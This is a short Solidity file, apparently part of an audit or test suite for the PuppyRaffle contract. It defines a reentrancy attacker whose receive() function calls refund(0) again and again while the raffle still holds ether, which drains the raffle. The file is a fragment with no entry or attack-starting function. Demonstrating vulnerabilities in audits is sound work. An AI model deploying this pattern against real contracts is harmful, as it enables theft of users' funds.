// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "../../src/PuppyRaffle.sol";
import {Test, console} from "forge-std/Test.sol";


contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    constructor (address _address) payable {
        puppyRaffle = PuppyRaffle(_address);
    }

    receive () external payable {
        if (address(puppyRaffle).balance > 0) {
            puppyRaffle.refund(0);
        }
    }
}